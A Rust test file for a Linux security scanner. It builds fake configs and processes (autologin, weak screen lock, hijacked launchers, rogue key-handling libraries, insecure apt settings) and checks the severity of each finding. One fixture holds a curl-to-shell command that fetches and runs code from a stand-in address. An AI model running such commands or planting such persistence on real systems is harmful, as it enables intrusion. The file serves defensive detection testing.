//! Login, screen lock, Wayland, sound and camera, keys, local services, containers, Debian
//! integrity, the Info level and the context lines. Made-up files in a temporary directory;
//! nothing on the real system is read or changed.

use scanner::baseline::{self, Baseline};
use scanner::config::Config;
use scanner::finding::Finding;
use scanner::modules::browsers::enabled_addons;
use scanner::modules::desktop_session::environments::weak_kde_lock;
use scanner::modules::desktop_session::media::{audio_settings, permitted_apps, recordings};
use scanner::modules::desktop_session::session::{automatic_logins, open_input_rules};
use scanner::modules::net_proc::local_only_service;
use scanner::modules::netwatch::separate_routes;
use scanner::modules::persistence::apt::{apt_settings, judge_apt_setting};
use scanner::modules::persistence::hooks::quadlet_risks;
use scanner::modules::persistence::keys::{gpg_programs, loaded_libraries, nss_libraries, odd_libraries, p11_module};
use scanner::modules::wallet::judge_owner;
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn program(root: &Path, abs: &str, content: &str) {
    write(root, abs, content);
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(0o755)).expect("chmod");
}

fn link(root: &Path, abs: &str, target: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    symlink(target, p).expect("link");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn of<'a>(report: &'a Report, rule: &str) -> Vec<&'a Finding> {
    report.findings.iter().filter(|f| f.rule == rule).collect()
}

fn levels(report: &Report, rule: &str) -> Vec<Severity> {
    let mut v: Vec<Severity> = of(report, rule).iter().map(|f| f.severity).collect();
    v.sort();
    v
}

fn fake_process(root: &Path, pid: u32, ppid: u32, exe: &str, cmdline: &str) {
    let name = exe.rsplit('/').next().unwrap_or("p");
    write(root, &format!("/proc/{pid}/stat"), &format!("{pid} ({name}) S {ppid} 1 1 0 -1 4194560 0 0 0 0 0 0 0 0 20 0 1 0 500 0 0\n"));
    write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{name}\nPPid:\t{ppid}\nUid:\t1000 1000 1000 1000\n"));
    write(root, &format!("/proc/{pid}/cmdline"), cmdline);
    link(root, &format!("/proc/{pid}/exe"), exe);
}

#[test]
fn login_lock_wayland_and_typing_tools() {
    assert_eq!(automatic_logins("/etc/sddm.conf", "[Autologin]\nUser=anna\n"), vec!["[Autologin] User=anna"]);
    assert!(automatic_logins("/etc/sddm.conf", "[Autologin]\nUser=\n").is_empty());
    assert_eq!(automatic_logins("/etc/gdm3/daemon.conf", "[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=anna\n").len(), 1);
    assert!(automatic_logins("/etc/gdm3/daemon.conf", "[daemon]\n#AutomaticLoginEnable=true\n").is_empty());
    assert_eq!(automatic_logins("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-user=anna\n").len(), 1);
    assert_eq!(weak_kde_lock("[Daemon]\nLockOnResume=false\nTimeout=15\nRequirePassword=false\n"), vec!["LockOnResume=false", "RequirePassword=false"]);
    assert_eq!(open_input_rules("KERNEL==\"uinput\", MODE=\"0666\"\nKERNEL==\"uinput\", GROUP=\"input\", MODE=\"0660\"\n").len(), 1);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/share/wayland-sessions/plasma.desktop", "");
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/etc/group", "input:x:104:anna\n");
    write(root, "/etc/sddm.conf.d/auto.conf", "[Autologin]\nUser=anna\n");
    write(root, "/var/lib/systemd/linger/anna", "");
    write(root, "/run/systemd/sessions/7", "UID=1000\nUSER=anna\nSTATE=active\nREMOTE=1\nREMOTE_HOST=198.51.100.7\nTYPE=x11\nCLASS=user\nSERVICE=xrdp-sesman\n");
    write(root, "/home/anna/.config/kwinrc", "[Xwayland]\nXwaylandEavesdrops=All\n");
    write(root, "/home/anna/.local/share/applications/firefox.desktop", "[Desktop Entry]\nExec=/home/anna/.cache/x/firefox %u\n");
    write(root, "/usr/share/applications/firefox.desktop", "[Desktop Entry]\nExec=/usr/bin/firefox %u\n");
    fake_process(root, 30, 1, "/usr/bin/Xwayland", "Xwayland\0:0\0-ac");
    fake_process(root, 31, 1, "/home/anna/Downloads/ydotoold", "ydotoold");
    link(root, "/proc/31/fd/3", "/dev/uinput");
    let report = scan(root, &[ModuleId::DesktopSession]);
    assert_eq!(levels(&report, "DESK-AUTOLOGIN"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "DESK-LINGER"), vec![Severity::Low]);
    assert_eq!(levels(&report, "DESK-SESSION-REMOTE"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "DESK-XSERVER-OPEN"), vec![Severity::High]);
    assert_eq!(levels(&report, "DESK-XWAYLAND-KEYS"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "DESK-INPUT-INJECT"), vec![Severity::High]);
    assert_eq!(levels(&report, "DESK-INPUT-GROUP"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "PERS-LAUNCHER"), vec![Severity::Medium]);
    assert!(report.inventory.persistence_files.contains_key("/home/anna/.local/share/applications/firefox.desktop"));
}

#[test]
fn sound_server_recording_and_portal_permissions() {
    let conf = "context.exec = [\n    { path = \"/home/anna/.cache/s\" args = \"-d\" }\n]\npulse.cmd = [\n  { cmd = \"load-module\" args = \"module-native-protocol-tcp\" }\n  { cmd = \"load-module\" args = \"module-null-sink\" }\n]\n# { path = \"commented\" }\n";
    let found = audio_settings(conf);
    assert_eq!(found.commands, vec!["/home/anna/.cache/s -d"]);
    assert_eq!((found.network.len(), found.virtual_devices.len()), (1, 1));
    assert_eq!(audio_settings("context.modules = [ { name = libpipewire-module-rt } ]\n"), Default::default());

    let dump = r#"[{"id":40,"type":"PipeWire:Interface:Client","info":{"props":{"application.name":"recorder","pipewire.sec.pid":77}}},
        {"id":41,"type":"PipeWire:Interface:Node","info":{"props":{"media.class":"Stream/Input/Audio","client.id":40,"stream.capture.sink":"true"}}},
        {"id":42,"type":"PipeWire:Interface:Node","info":{"props":{"media.class":"Audio/Sink"}}}]"#;
    let r = recordings(dump);
    assert_eq!(r.len(), 1);
    assert_eq!((r[0].kind, r[0].app.as_str(), r[0].pid, r[0].of_speakers), ("audio", "recorder", Some(77), true));

    let answer = r#"{"type":"a{sas}v","data":[{"com.example.Chat":["yes"],"com.example.No":["no"],"":["yes"]},{"type":"y","data":0}]}"#;
    assert_eq!(permitted_apps(answer).len(), 2);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/share/wayland-sessions/plasma.desktop", "");
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.config/pipewire/pipewire.conf.d/x.conf", conf);
    fake_process(root, 33, 1, "/tmp/cam", "cam");
    link(root, "/proc/33/fd/4", "/dev/video0");
    let report = scan(root, &[ModuleId::DesktopSession]);
    assert_eq!(levels(&report, "DESK-AUDIO-EXEC"), vec![Severity::High]);
    assert_eq!(levels(&report, "DESK-AUDIO-NETWORK"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "DESK-AUDIO-VIRTUAL"), vec![Severity::Info]);
    assert_eq!(levels(&report, "DESK-DEVICE-OPEN"), vec![Severity::High]);
}

#[test]
fn programs_and_libraries_that_handle_keys() {
    assert_eq!(gpg_programs("# pinentry-program /x\npinentry-program /tmp/p\nenable-ssh-support\n"), vec![("pinentry-program".to_string(), "/tmp/p".to_string())]);
    assert_eq!(p11_module("module: p11-kit-trust.so\n").0.as_deref(), Some("p11-kit-trust.so"));
    assert_eq!(nss_libraries("library=\nname=NSS\nlibrary=/home/anna/x.so\n"), vec!["/home/anna/x.so"]);
    assert_eq!(loaded_libraries("Host *\n  PKCS11Provider /tmp/p.so\n  SecurityKeyProvider internal\n"), vec!["/tmp/p.so"]);
    let maps = "7f00 r-xp 0 08:01 1 /usr/lib/libc.so.6\n7f01 r-xp 0 08:01 2 /home/anna/.x/evil.so\n7f02 r--p 0 08:01 3 /home/anna/notes.txt\n";
    assert_eq!(odd_libraries(maps), vec!["/home/anna/.x/evil.so"]);
    let cfg = Config::default();
    let owner = |n: &str, exe: &str| judge_owner(&cfg, "org.freedesktop.secrets", &[n.to_string()], exe);
    assert_eq!(owner("ksecretd", "/usr/bin/ksecretd"), None);
    assert_eq!(owner("ksecretd", "/home/anna/ksecretd"), Some(Severity::High));
    assert_eq!(owner("other", "/usr/bin/other"), Some(Severity::Medium));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.gnupg/gpg-agent.conf", "pinentry-program /home/anna/.cache/pin\n");
    write(root, "/home/anna/.config/pkcs11/modules/x.module", "module: /home/anna/lib/p.so\nremote: |sh -c 'curl http://198.51.100.7/x | sh'\n");
    write(root, "/home/anna/.ssh/config", "PKCS11Provider /tmp/p.so\n");
    fake_process(root, 50, 1, "/usr/bin/ssh-agent", "ssh-agent");
    write(root, "/proc/50/maps", maps);
    let report = scan(root, &[ModuleId::Persistence, ModuleId::ProcAudit]);
    assert_eq!(levels(&report, "PERS-GPG-PROGRAM"), vec![Severity::High]);
    let mut modules = levels(&report, "PERS-KEY-MODULE");
    modules.dedup();
    assert!(modules.contains(&Severity::Critical) || modules.contains(&Severity::High), "{modules:?}");
    assert_eq!(of(&report, "PERS-KEY-MODULE").len(), 3);
    assert_eq!(levels(&report, "PROC-KEY-LIBRARY"), vec![Severity::High]);
}

#[test]
fn local_services_open_to_the_network_and_separate_routes() {
    let names = |n: &str| vec![n.to_string()];
    let kind = |n: &str, line: &str, port: u16| local_only_service(&names(n), line, port).map(|s| s.1);
    assert_eq!(kind("chrome", "chrome --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0", 9222), Some(Severity::High));
    assert_eq!(kind("node", "node --inspect=0.0.0.0:9229 app.js", 9229), Some(Severity::High));
    assert_eq!(kind("redis-server", "redis-server *:6379", 6379), Some(Severity::Medium));
    assert_eq!(kind("ollama", "ollama serve", 11434), Some(Severity::Medium));
    assert_eq!(kind("node", "node /srv/mcp/server.js --mcp", 3000), Some(Severity::Medium));
    assert_eq!(kind("python3", "python3 -m http.server", 8000), Some(Severity::Medium));
    assert_eq!(kind("sshd", "sshd -D", 22), None);
    assert_eq!(kind("tcpmcpd", "tcpmcpd", 80), None);

    let routes = r#"[{"dst":"default","dev":"wlan0"},{"dst":"100.1.2.3","dev":"tailscale0","table":"52"},
        {"dst":"default","dev":"tun9","table":"100"},{"dst":"10.0.0.255","dev":"wlan0","table":"local","type":"broadcast"}]"#;
    let (expected, other) = separate_routes(routes);
    assert_eq!(expected.len(), 1);
    assert_eq!(other, vec!["table 100 through tun9: 1 route(s), including all traffic"]);
}

#[test]
fn containers_apt_settings_and_debian_layout() {
    assert_eq!(quadlet_risks("[Container]\nImage=x\nVolume=/:/host\nNetwork=host\nVolume=data:/data\n").len(), 2);
    let settings = apt_settings("// Acquire::AllowInsecureRepositories \"true\";\nAcquire {\n  http { Proxy \"http://u:pw@proxy:3128\"; };\n};\nAPT::Get::AllowUnauthenticated \"true\";\n");
    assert_eq!(settings.len(), 2);
    assert_eq!(settings[0].0, "Acquire::http::Proxy");
    assert_eq!(judge_apt_setting(&settings[1].0, "true").map(|s| s.0), Some(Severity::Medium));
    assert_eq!(judge_apt_setting("Acquire::Retries", "3"), None);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.config/containers/systemd/web.container", "[Container]\nImage=x\nVolume=%h:/data\n");
    write(root, "/etc/apt/apt.conf.d/99x", "Acquire::https::Verify-Peer \"false\";\nAcquire::http::Proxy \"http://u:secretpw@proxy:3128\";\n");
    write(root, "/var/lib/dpkg/info/usr-is-merged.list", "/.\n");
    write(root, "/var/lib/dpkg/info/base.list", "/usr/share/keyrings/debian.gpg\n");
    write(root, "/usr/share/keyrings/debian.gpg", "key");
    write(root, "/etc/apt/trusted.gpg.d/other.asc", "key");
    write(root, "/var/lib/dpkg/diversions", "/usr/bin/ssh\n/usr/bin/ssh.real\n:\n/usr/bin/luit\n/usr/bin/luit.x\nluit\n");
    write(root, "/usr/bin/ssh", "x");
    link(root, "/bin", "usr/bin");
    fs::create_dir_all(root.join("sbin")).expect("mkdir");
    program(root, "/etc/kernel/postinst.d/zz-own", "#!/bin/sh\necho\n");
    write(root, "/boot/efi/EFI/Linux/debian.efi", "image");
    let report = scan(root, &[ModuleId::Persistence, ModuleId::FsPerms]);
    assert_eq!(levels(&report, "PERS-QUADLET"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "PERS-APT-CONFIG"), vec![Severity::Medium]);
    assert!(!serde_json::to_string(&report).expect("json").contains("secretpw"));
    assert_eq!(levels(&report, "PERS-APT-KEY"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "FS-USRMERGE"), vec![Severity::High]);
    let diverted = of(&report, "FS-DIVERSION");
    assert!(diverted.len() == 1 && diverted[0].evidence.contains("/usr/bin/ssh") && !diverted[0].evidence.contains("luit"));
    assert_eq!(levels(&report, "PERS-KERNEL-HOOK"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "PERS-UKI"), vec![Severity::Info]);
}

#[test]
fn info_level_user_level_context_and_new_addons() {
    assert!(Severity::Info < Severity::Low);
    assert_eq!("info".parse::<Severity>(), Ok(Severity::Info));
    let chrome = serde_json::json!({"extensions": {"settings": {"abc": {"state": 1, "location": 1, "manifest": {"name": "Blocker"}}, "off": {"state": 0, "manifest": {"name": "Off"}}}}});
    assert_eq!(enabled_addons(&chrome), vec!["abc Blocker"]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/share/xsessions/x.desktop", "");
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/var/lib/dpkg/info/coreutils.list", "/usr/bin/sleep\n/usr/bin/true\n");
    write(root, "/usr/bin/true", "x");
    write(root, "/home/anna/.config/autostart/own.desktop", "[Desktop Entry]\nExec=/usr/bin/true\n");
    write(root, "/home/anna/.config/chromium/Default/Preferences", "{\"extensions\":{\"settings\":{}}}");
    write(root, "/proc/stat", "btime 1790000000\n");
    fake_process(root, 1, 0, "/usr/lib/systemd/systemd", "init");
    fake_process(root, 60, 1, "/tmp/thing", "thing");
    let before = scan(root, &[ModuleId::DesktopSession, ModuleId::ProcAudit, ModuleId::FsPerms]);
    let autostart = of(&before, "PERS-AUTOSTART");
    assert_eq!(autostart[0].severity, Severity::Info);
    assert!(autostart[0].user_level);
    assert!(autostart[0].evidence.contains("context: modified "), "{}", autostart[0].evidence);
    let temp = of(&before, "PROC-TMP-EXE");
    assert!(temp[0].evidence.contains("context: PID 60 PPID 1 (systemd) UID 1000, package: none, started "), "{}", temp[0].evidence);
    assert!(!temp[0].user_level);
    assert_eq!(before.summary.info, before.findings.iter().filter(|f| f.severity == Severity::Info).count());
    let text = before.to_text(false);
    assert!(text.contains("[INFO]") && text.contains("[user] "));

    write(root, "/home/anna/.config/chromium/Default/Preferences", "{\"extensions\":{\"settings\":{\"abc\":{\"state\":1,\"location\":1,\"from_webstore\":true,\"manifest\":{\"name\":\"New\"}}}}}");
    let after = scan(root, &[ModuleId::FsPerms]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&before), &after.inventory, &after.modules);
    assert_eq!(changes.iter().filter(|f| f.rule == "BASE-ADDON-NEW").count(), 1);
}
